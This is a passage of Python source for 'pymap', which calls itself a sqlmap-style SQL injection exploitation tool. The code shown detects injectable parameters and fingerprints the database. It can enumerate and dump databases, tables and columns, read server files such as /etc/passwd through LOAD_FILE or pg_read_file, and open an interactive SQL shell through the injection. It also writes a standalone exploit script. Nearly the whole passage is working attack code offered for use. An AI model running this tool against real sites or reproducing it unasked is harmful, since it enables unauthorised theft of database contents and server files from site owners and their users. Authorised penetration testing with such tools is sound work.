    if "U" in inj.techniques:
        for q, dbms in [("SELECT @@version", None),
                        ("SELECT sqlite_version()", "SQLite"),
                        ("SELECT version()", None)]:
            v = extractor._union_probe(q)
            if v:
                if dbms:
                    return dbms
                if "MariaDB" in v or "MySQL" in v:
                    return "MySQL"
                if "PostgreSQL" in v or "postgres" in v.lower():
                    return "PostgreSQL"
                if "Microsoft" in v or "SQL Server" in v:
                    return "MSSQL"
        return hint or "MySQL"

    return hint or "MySQL"


# ---------------------------------------------------------------- output helpers
def print_table(headers, rows):
    widths = [max(len(str(h)), *(len(str(r[i])) for r in rows)) if rows else len(str(h))
              for i, h in enumerate(headers)]
    line = "+" + "+".join("-" * (w + 2) for w in widths) + "+"
    fmt = "|" + "|".join(f" {{:{w}}} " for w in widths) + "|"
    print(line)
    print(fmt.format(*headers))
    print(line)
    for r in rows:
        print(fmt.format(*[str(x) for x in r]))
    print(line)


def save_csv(path, headers, rows):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(headers)
        w.writerows(rows)


# ---------------------------------------------------------------- main engine
class Pymap:
    def __init__(self, opts):
        self.opts = opts
        self.outdir = os.path.join(opts.output_dir,
                                   urllib.parse.urlparse(opts.url).hostname or "target")
        os.makedirs(self.outdir, exist_ok=True)
        self.state = StateStore(os.path.join(self.outdir, "state.json"))
        self.client = HttpClient(opts)
        self.t = self.target = self._parse_target()
        self.injectables = []
        self.extractor = None
        self.dialect = None
        self.dbms = None
        self.banner = None
        self.current_db = None
        self.current_user = None

    # ---- target parsing with * marker support
    def _parse_target(self):
        url = self.opts.url
        marked = []
        raw_url = url
        qs = ""
        if "?" in url:
            raw_url, qs = url.split("?", 1)
        url_pairs = HttpClient.parse_qs(qs)

        data_pairs = HttpClient.parse_qs(getattr(self.opts, "data", None) or "")

        # marker: value == '*'
        for loc, pairs in (("url", url_pairs), ("data", data_pairs)):
            for p in pairs:
                if p[1] == "*":
                    p[1] = "1"
                    marked.append((loc, p[0], "1"))
        cookie_str = self.opts.cookie or ""
        for kv in cookie_str.split(";"):
            kv = kv.strip()
            if "=" in kv and kv.split("=", 1)[1].strip() == "*":
                k = kv.split("=", 1)[0].strip()
                cookie_str = cookie_str.replace(kv, k + "=1")
                marked.append(("cookie", k, "1"))

        headers = {}
        for h in (self.opts.header or []):
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()

        method = (getattr(self.opts, "method", None)
                  or ("POST" if data_pairs else "GET")).upper()
        t = Target(raw_url, method, url_pairs, data_pairs, cookie_str, headers)
        t.marked = marked
        return t

    def _baseline(self):
        r = self.client.request(self.t.method, self.t.url, self.t.url_pairs,
                                self.t.data_pairs, self.t.cookie_str, self.t.headers,
                                tag="baseline")
        self.t.baseline = r
        log(1, f"[*] baseline: {r.status} len={len(r.body)} latency={r.latency:.2f}s "
               f"url={r.url[:100]}")
        return r

    # ---- detection pass
    def detect(self):
        excluded = {x.strip().lower() for x in
                    (getattr(self.opts, "exclude_param", "") or "").split(",") if x.strip()}
        self._baseline()
        det = Detector(self.client, self.target, self.opts)
        techniques = list(self.opts.technique)
        candidates = self.target.candidates(self.opts.level,
                                           getattr(self.target, "marked", None))
        if not candidates:
            log(0, "[!] no testable parameters (check --data / --cookie / --level)")
            return False

        for location, name, orig in candidates:
            if name.lower() in excluded:
                log(1, f"[-] skipping excluded parameter '{name}'")
                continue
            if orig == "":
                orig = "1"
            inj, hint = det.run(location, name, orig, techniques,
                                risk=self.opts.risk)
            if inj:
                self.injectables.append(inj)
                log(1, f"[+] parameter '{name}' ({location}) is injectable "
                       f"[technique(s): {','.join(inj.techniques.keys())}]")
                return True
            log(1, f"[-] parameter '{name}' ({location}) appears clean")
        return False

    # ---- choose extractor + fingerprint
    def prepare_extractor(self):
        inj = self.injectables[0]
        orig = "1"
        for loc, pairs in (("url", self.t.url_pairs), ("data", self.t.data_pairs)):
            if loc == inj.location:
                for k, v in pairs:
                    if k == inj.param:
                        orig = v
        if inj.location == "cookie" and self.t.cookie_str:
            for kv in self.t.cookie_str.split(";"):
                kv = kv.strip()
                if "=" in kv and kv.split("=", 1)[0].strip() == inj.param:
                    orig = kv.split("=", 1)[1].strip()
        inj._orig = orig or "1"

        hint = inj.dbms or fingerprint_error(self.t.baseline.body or "")
        self.dialect = Dialect(hint or "MySQL")
        self.extractor = Extractor(self.client, self.t, inj, self.opts, self.dialect,
                                  self.state)
        self.dbms = fingerprint_dbms(self.extractor, hint)
        self.dialect = Dialect(self.dbms)
        self.extractor.d = self.dialect
        if "U" in inj.techniques:
            inj.marker_style = {"MySQL": "CONCAT", "PostgreSQL": "PIPES",
                                "SQLite": "PIPES", "MSSQL": "PLUS",
                                "Oracle": "PIPES"}.get(self.dbms, inj.marker_style)
        log(1, f"[*] DBMS fingerprint: {self.dbms}")

        self.banner = self.safe_extract(self.dialect.q_banner())
        if self.banner:
            log(1, f"[+] banner: {self.banner[:120]}")
        self.current_db = self.safe_extract(self.dialect.q_current_db()) or "?"
        self.current_user = self.safe_extract(self.dialect.q_current_user()) or "?"
        log(1, f"[+] current database: {self.current_db}")
        log(1, f"[+] current user: {self.current_user}")
        evidence({"kind": "fingerprint", "dbms": self.dbms, "banner": self.banner,
                  "db": self.current_db, "user": self.current_user})

    def safe_extract(self, query):
        try:
            return self.extractor.extract(query)
        except Exception as e:
            log(3, f"      [-] extract error on {query[:50]}: {e}")
            return None

    # ---- enumeration actions
    def run_actions(self):
        o = self.opts
        ex = self.safe_extract
        did = False

        if o.dbs:
            did = True
            dbs = [d.strip() for d in (ex(self.dialect.q_dbs()) or "").split(",")
                   if d.strip()]
            if o.exclude_sysdbs:
                dbs = [d for d in dbs if d.lower() not in SYS_DBS]
            log(0, "\n[+] available databases:")
            print_table(["database"], [[d] for d in dbs])
            evidence({"kind": "dbs", "dbs": dbs})

        if o.tables:
            did = True
            db = o.db or (self.current_db if self.current_db != "?" else None)
            if not db:
                log(0, "[!] --tables needs -D <db>")
            else:
                tbls = [t.strip() for t in (ex(self.dialect.q_tables(db)) or "").split(",")
                        if t.strip()]
                log(0, f"\n[+] tables in {db}:")
                print_table(["table"], [[t] for t in tbls])
                evidence({"kind": "tables", "db": db, "tables": tbls})

        if o.columns:
            did = True
            db = o.db or (self.current_db if self.current_db != "?" else None)
            if not db or not o.table:
                log(0, "[!] --columns needs -D <db> -T <table>")
            else:
                cols = [c.strip() for c in
                        (ex(self.dialect.q_columns(db, o.table)) or "").split(",") if c.strip()]
                log(0, f"\n[+] columns of {db}.{o.table}:")
                print_table(["column"], [[c] for c in cols])
                evidence({"kind": "columns", "db": db, "table": o.table, "columns": cols})

        if o.count:
            did = True
            db = o.db or self.current_db
            if o.table:
                n = ex(self.dialect.q_count(db if self.dbms != "SQLite" else None,
                                            o.table))
                log(0, f"\n[+] {db}.{o.table}: {n} rows")
            else:
                log(0, "[!] --count needs -T <table>")

        if o.dump:
            did = True
            db = o.db or (self.current_db if self.current_db != "?" else None)
            if not o.table:
                log(0, "[!] --dump needs -T <table>")
            else:
                self.dump_table(db, o.table, o.columns_list, o.limit)

        if o.dump_all:
            did = True
            dbs = [d.strip() for d in (ex(self.dialect.q_dbs()) or "").split(",")
                   if d.strip()]
            if o.exclude_sysdbs:
                dbs = [d for d in dbs if d.lower() not in SYS_DBS]
            for db in dbs:
                dbq = None if self.dbms == "SQLite" else db
                tbls = [t.strip() for t in
                        (ex(self.dialect.q_tables(dbq or "main")) or "").split(",") if t.strip()]
                for tbl in tbls:
                    if tbl.lower() in ("sqlite_sequence", "sqlite_master"):
                        continue
                    self.dump_table(dbq, tbl, None, o.limit)

        if o.schema:
            did = True
            dbs = [d.strip() for d in (ex(self.dialect.q_dbs()) or "").split(",")
                   if d.strip()]
            if o.exclude_sysdbs:
                dbs = [d for d in dbs if d.lower() not in SYS_DBS]
            if o.db:
                dbs = [d for d in dbs if d == o.db]
            rows = []
            for db in dbs:
                dbq = None if self.dbms == "SQLite" else db
                tbls = [t.strip() for t in
                        (ex(self.dialect.q_tables(dbq or "main")) or "").split(",")
                        if t.strip()]
                for tbl in tbls:
                    cols_raw = ex(self.dialect.q_columns(dbq or "main", tbl))
                    cols = ",".join(c.strip() for c in (cols_raw or "").split(",")
                                    if c.strip())
                    rows.append([db, tbl, cols])
            log(0, f"\n[+] schema ({len(rows)} tables):")
            print_table(["database", "table", "columns"], rows)
            evidence({"kind": "schema", "rows": rows})

        if o.search:
            did = True
            pat = o.table or o.columns_list
            if not pat:
                log(0, "[!] --search needs -T <table-pattern> or -C <column-pattern>")
            else:
                matches = self._search(o, pat, ex)
                log(0, f"\n[+] search results for {pat!r}:")
                if matches:
                    print_table(["match"], [[m] for m in matches])
                else:
                    log(0, "    (no matches)")
                evidence({"kind": "search", "pattern": pat, "matches": matches})

        if o.file_read:
            did = True
            path = o.file_read
            q = None
            if self.dbms == "MySQL":
                q = f"SELECT LOAD_FILE('{path}')"
            elif self.dbms == "PostgreSQL":
                q = f"SELECT pg_read_file('{path}')"
            elif self.dbms == "MSSQL":
                q = None
            if q:
                val = ex(q)
                if val:
                    # MariaDB's XPATH-error channel escapes control chars; restore them
                    val = (val.replace("\\r\\n", "\n").replace("\\n", "\n")
                              .replace("\\r", "\r").replace("\\t", "\t"))
                    outdir = os.path.join(self.outdir, "files")
                    os.makedirs(outdir, exist_ok=True)
                    fname = os.path.join(outdir, os.path.basename(path) or "file")
                    with open(fname, "w") as f:
                        f.write(val)
                    head = "\n".join(val.splitlines()[:5])
                    log(0, f"\n[+] file read OK ({len(val)} chars) -> {fname}")
                    log(0, "    head:\n" + "\n".join("    " + l for l in head.splitlines()))
                    evidence({"kind": "file_read", "path": path, "chars": len(val),
                              "saved": fname})
                else:
                    log(0, f"\n[-] could not read {path} (permission, secure_file_priv "
                           f"or wrong DBMS support)")
            else:
                log(0, f"\n[-] --file-read not supported for {self.dbms}")

        if o.sql_shell:
            did = True
            log(0, "\n[*] SQL shell through the injection. Scalar queries only "
                   "(add LIMIT 1). Type 'exit' to quit.")
            while True:
                try:
                    q = input("sql> ").strip()
                except (EOFError, KeyboardInterrupt):
                    print()
                    break
                if not q:
                    continue
                if q.lower() in ("exit", "quit", "q"):
                    break
                val = ex(q)
                if val is not None:
                    log(0, f"[+] {val}")
                    evidence({"kind": "sql_shell", "query": q, "result": val})
                else:
                    log(0, "[-] no scalar result (error? try LIMIT 1 / a subquery)")

        if o.sql_query:
            did = True
            log(0, f"\n[*] executing query: {o.sql_query}")
            val = ex(o.sql_query)
            if val is not None:
                log(0, f"[+] result:\n{val}")
                evidence({"kind": "sql_query", "query": o.sql_query, "result": val})
            else:
                log(0, "[-] query returned no extractable value")

        if not did:
            log(0, "\n[*] injection confirmed. Use --dbs / --tables / --dump / "
                   "--sql-query to extract data.")

    def _search(self, o, pattern, ex):
        """Search table names (-T) or column names (-C) across databases."""
        like = pattern.replace("*", "%")
        search_cols = bool(o.columns_list) and not o.table
        if self.dbms == "MySQL":
            if search_cols:
                q = ("SELECT GROUP_CONCAT(CONCAT_WS(0x2e,table_schema,table_name,"
                     f"column_name)) FROM information_schema.columns WHERE column_name "
                     f"LIKE '{like}'")
            else:
                q = ("SELECT GROUP_CONCAT(CONCAT_WS(0x2e,table_schema,table_name)) "
                     f"FROM information_schema.tables WHERE table_name LIKE '{like}'")
            raw = ex(q) or ""
            return [m for m in raw.split(",") if m]
        if self.dbms == "PostgreSQL":
            op = "ILIKE"
            if search_cols:
                q = (f"SELECT string_agg(table_schema||'.'||table_name||'.'||column_name,',') "
                     f"FROM information_schema.columns WHERE column_name {op} '{like}'")
            else:
                q = (f"SELECT string_agg(table_schema||'.'||table_name,',') "
                     f"FROM information_schema.tables WHERE table_name {op} '{like}'")
            raw = ex(q) or ""
            return [m for m in raw.split(",") if m]
        # generic fallback: enumerate schema locally and filter
        dbs = [d.strip() for d in (ex(self.dialect.q_dbs()) or "").split(",")
               if d.strip()]
        if o.exclude_sysdbs:
            dbs = [d for d in dbs if d.lower() not in SYS_DBS]
        out = []
        for db in dbs:
            dbq = None if self.dbms == "SQLite" else db
            tbls = [t.strip() for t in
                    (ex(self.dialect.q_tables(dbq or "main")) or "").split(",") if t.strip()]
            for t in tbls:
                name = t.lower()
                hit_t = like.replace("%", "") in name
                if not search_cols:
                    if hit_t:
                        out.append(f"{db}.{t}")
                    continue
                cols_raw = ex(self.dialect.q_columns(dbq or "main", t))
                for c in (cols_raw or "").split(","):
                    c = c.strip()
                    if c and like.replace("%", "") in c.lower():
                        out.append(f"{db}.{t}.{c}")
        return out

    def dump_table(self, db, table, cols, limit):
        ex = self.safe_extract
        dbq = db if (db and self.dbms != "SQLite") else None
        if cols:
            columns = [c.strip() for c in cols.split(",")]
        else:
            cols_raw = ex(self.dialect.q_columns(dbq or "main", table))
            columns = [c.strip() for c in (cols_raw or "").split(",") if c.strip()]
        if not columns:
            log(0, f"[-] could not enumerate columns of {table}")
            return
        n = ex(self.dialect.q_count(dbq, table))
        try:
            n = int(n) if n is not None else limit
        except ValueError:
            n = limit
        n = min(n, limit)
        log(0, f"\n[+] dumping {f'{db}.' if db else ''}{table} "
               f"({n} row(s), columns: {', '.join(columns)})")
        rows = []
        for i in range(n):
            raw = ex(self.dialect.q_row(dbq, table, columns, i))
            if raw is None:
                break
            parts = raw.split(":", len(columns) - 1)
            rows.append(parts)
            log(1, f"    row {i+1}: {parts}")
        if rows:
            print_table(columns, rows)
            csv_path = os.path.join(self.outdir, f"{(db or 'sqlite')}_{table}.csv")
            save_csv(csv_path, columns, rows)
            log(0, f"[+] saved: {csv_path}")
            evidence({"kind": "dump", "db": db, "table": table, "columns": columns,
                      "rows": rows})

    # ---- report + poc
    def write_report(self):
        report = {
            "tool": VERSION,
            "target": self.opts.url,
            "method": self.target.method,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "dbms": self.dbms,
            "banner": self.banner,
            "current_db": self.current_db,
            "current_user": self.current_user,
            "injections": [{
                "parameter": i.param,
                "location": i.location,
                "context": i.context.name,
                "techniques": list(i.techniques.keys()),
                "union_columns": i.union_cols or None,
                "union_echo_position": i.union_pos or None,
            } for i in self.injectables],
            "requests_sent": self.client.req_count,
            "extractor_stats": self.extractor.stats if self.extractor else {},
        }
        with open(os.path.join(self.outdir, "session.json"), "w") as f:
            json.dump(report, f, indent=2)
        with open(os.path.join(self.outdir, "evidence.jsonl"), "w") as f:
            for row in _EVIDENCE:
                f.write(json.dumps(row) + "\n")
        log(1, f"[*] report: {os.path.join(self.outdir, 'session.json')} "
               f"({self.client.req_count} requests sent)")

        if getattr(self.opts, "gen_poc", False) and self.injectables:
            self.write_poc()

    def write_poc(self):
        inj = self.injectables[0]
        path = os.path.join(self.outdir, "poc.py")
        with open(path, "w") as f:
            f.write(self._poc_source(inj))
        os.chmod(path, 0o755)
        log(0, f"[+] standalone PoC written: {path}")

    def _poc_source(self, inj):
        return f'''#!/usr/bin/env python3
"""PoC generated by pymap — SQL injection in parameter '{inj.param}' ({inj.location}).
Target: {self.opts.url}
DBMS: {self.dbms}
Technique(s): {','.join(inj.techniques.keys())}
Context: {inj.context.name}
Usage: python3 poc.py ["SELECT version()"]
"""
import re
import sys
import requests
from urllib.parse import quote_plus

URL = {self.opts.url!r}
PARAM = {inj.param!r}
MARK_OPEN, MARK_CLOSE = "zqX7Kp", "Kp7Xqz"

def inject(value):
    base, qs = URL.split("?", 1)
    pairs = []
    for part in qs.split("&"):
        k, v = part.split("=", 1)
        pairs.append((k, value if k == PARAM else v))
    qs = "&".join(k + "=" + quote_plus(v, safe="") for k, v in pairs)
    return requests.get(base + "?" + qs, timeout=30)

def extract_scalar(query):
    """UNION-based scalar extraction using the confirmed echo position."""
    marker = "CONCAT('" + MARK_OPEN + "',(" + query + "),'" + MARK_CLOSE + "')"
    sel = ["NULL"] * {inj.union_cols}
    sel[{inj.union_pos - 1}] = marker
    payload = {inj.context.union_tmpl!r}.format(orig={inj._orig!r}, sel=", ".join(sel))
    r = inject(payload)
    m = re.search(re.escape(MARK_OPEN) + r"(.*?)" + re.escape(MARK_CLOSE), r.text, re.S)
    return m.group(1) if m else None

if __name__ == "__main__":
    q = sys.argv[1] if len(sys.argv) > 1 else {self.dialect.q_banner()!r}
    print("[*] injecting:", q)
    print("[+] result:", extract_scalar(q))
'''


# ---------------------------------------------------------------- CLI
def build_argparser():
    p = argparse.ArgumentParser(
        prog="pymap", description="pymap - sqlmap-style SQL injection exploitation tool",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-u", "--url", help="target URL (mark injectable param value with *)")
    p.add_argument("--data", help='POST data string (e.g. "user=a&pass=b")')
    p.add_argument("--cookie", help="HTTP Cookie header value")
    p.add_argument("-H", "--header", action="append", help="extra header 'Name: value' (repeatable)")
    p.add_argument("--method", help="force HTTP method (default GET/POST auto)")
    p.add_argument("--level", type=int, default=1, help="1=url+post, 2=+cookies (default 1)")
    p.add_argument("--risk", type=int, default=1, help="1=AND-based, 2=+OR-based (default 1)")
    p.add_argument("--technique", default="UEBT",
                  help="techniques: E=error, B=boolean, T=time, U=union (default UEBT)")
    p.add_argument("--tamper", help="comma list: space2comment,randomcase,between,charencode,"
                                    "space2plus,space2tab,equaltolike")
    # enumeration
    p.add_argument("--dbs", action="store_true", help="enumerate databases")
    p.add_argument("--tables", action="store_true", help="enumerate tables (-D db)")
    p.add_argument("--columns", action="store_true", help="enumerate columns (-D db -T tbl)")
    p.add_argument("--count", action="store_true", help="count table rows (-T tbl)")
    p.add_argument("--dump", action="store_true", help="dump table (-D db -T tbl)")
    p.add_argument("--dump-all", action="store_true", help="dump all databases/tables")
    p.add_argument("-D", "--db", help="target database")
    p.add_argument("-T", "--table", help="target table")
    p.add_argument("-C", "--columns-list", dest="columns_list",
                   help="target columns (comma list)")
    p.add_argument("--exclude-sysdbs", action="store_true", help="exclude system databases")
    p.add_argument("--limit", type=int, default=10, help="max rows per table dump (default 10)")
    p.add_argument("--sql-query", dest="sql_query", help="execute arbitrary SQL (scalar result)")
    p.add_argument("--sql-shell", dest="sql_shell", action="store_true",
                   help="interactive SQL shell through the injection (type 'exit' to quit)")
    p.add_argument("--schema", action="store_true",
                   help="enumerate full schema: database -> tables -> columns")
    p.add_argument("--search", action="store_true",
                   help="search table names (-T pattern) or column names (-C pattern) across dbs")
    p.add_argument("--file-read", dest="file_read",
                   help="read a server-side file (MySQL LOAD_FILE / PostgreSQL pg_read_file)")
    p.add_argument("--exclude-param", dest="exclude_param",
                   help="comma list of parameter names to skip (e.g. csrf_token,session)")
    # flow
    p.add_argument("--delay", type=float, default=0, help="delay seconds between requests")
    p.add_argument("--timeout", type=float, default=30, help="request timeout (default 30)")
    p.add_argument("--retries", type=int, default=2, help="retries per request (default 2)")
    p.add_argument("--time-sec", type=int, default=5, help="sleep seconds for time-based (default 5)")
    p.add_argument("--threads", type=int, default=1, help="(reserved) parallelism")
    p.add_argument("--user-agent", help="custom User-Agent")
    p.add_argument("--proxy", help="proxy URL (http://...)")
    p.add_argument("--insecure", action="store_true", help="ignore TLS errors")
    p.add_argument("--batch", action="store_true", help="never ask questions")
    p.add_argument("-v", "--verbose", type=int, default=1, help="verbosity 0-3 (default 1)")
    p.add_argument("--output-dir", default="./pymap-output", help="output directory")
    p.add_argument("--gen-poc", action="store_true", help="write standalone poc.py")
    p.add_argument("--flush-session", action="store_true", help="discard cached extraction state")
    p.add_argument("--version", action="version", version=VERSION)
    return p


# ---------------------------------------------------------------- wizard (no -u given)
def wizard(opts):
    """Interactive setup when pymap is run without -u: ask target + action."""
    print(BANNER)
    print("[*] WIZARD MODE - pymap started without -u\n")
    try:
        url = input("Target URL (e.g. http://site/page?id=1): ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return False
    if not url:
        return False
    if "://" not in url:
        url = "http://" + url
    opts.url = url

    def _ask(prompt):
        try:
            return input(prompt).strip()
        except (EOFError, KeyboardInterrupt):
            return ""
    data = _ask("POST data (enter to skip, e.g. user=a&pass=b): ")
    if data:
        opts.data = data
    cookie = _ask("Cookie header (enter to skip): ")
    if cookie:
        opts.cookie = cookie
    marked = _ask("Mark specific param with * in the URL? (y/N): ").lower()
    if marked == "y" and "=" in url:
        opts.url = url.replace("=", "=*")

    print("\nWhat should pymap do after detection?")
    print("  1) detect + fingerprint only")
    print("  2) enumerate databases")
    print("  3) enumerate tables + columns (asks db)")
    print("  4) dump a table (asks db + table)")
    print("  5) read a server file (asks path)")
    print("  6) SQL shell (interactive queries)")
    print("  7) run an arbitrary SQL query (asks query)")
    print("  8) everything: dbs + schema")
    choice = _ask("Choice [1-8]: ") or "1"
    if choice == "2":
        opts.dbs = True
        opts.exclude_sysdbs = True
    elif choice == "3":
        opts.tables = True
        opts.columns = True
        opts.db = _ask("Database (enter = current): ") or None
        opts.table = _ask("Table for --columns (enter to skip columns): ") or None
    elif choice == "4":
        opts.dump = True
        opts.db = _ask("Database (enter = current): ") or None
        opts.table = _ask("Table to dump: ")
        opts.limit = int(_ask("Row limit [10]: ") or 10)
    elif choice == "5":
        opts.file_read = _ask("File path to read (e.g. /etc/passwd): ")
    elif choice == "6":
        opts.sql_shell = True
    elif choice == "7":
        opts.sql_query = _ask("SQL query (scalar, LIMIT 1): ")
    elif choice == "8":
        opts.dbs = True
        opts.schema = True
        opts.exclude_sysdbs = True
    return True


def main(argv=None):
    opts = build_argparser().parse_args(argv)
    global VERBOSE
    VERBOSE = opts.verbose
    opts.tamper = [t.strip() for t in opts.tamper.split(",")] if opts.tamper else []

    if not opts.url:
        if not wizard(opts):
            log(0, "[!] no target given. Use -u or run the wizard.")
            build_argparser().print_help()
            return 1
    else:
        print(BANNER)

    log(0, f"[*] starting at {datetime.now(timezone.utc).isoformat()}")
    log(0, f"[*] target: {opts.url}")

    pm = Pymap(opts)
    if opts.flush_session:
        pm.state.clear()

    if not pm.detect():
        log(0, "\n[!] all tested parameters appear to be not injectable.")
        log(0, "    try: --level 2 (cookies) / --risk 2 (OR-based) / --data for POST / "
              "adjust --technique")
        pm.write_report()
        return 1

    pm.prepare_extractor()
    pm.run_actions()
    pm.write_report()
    log(0, "\n[*] done.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
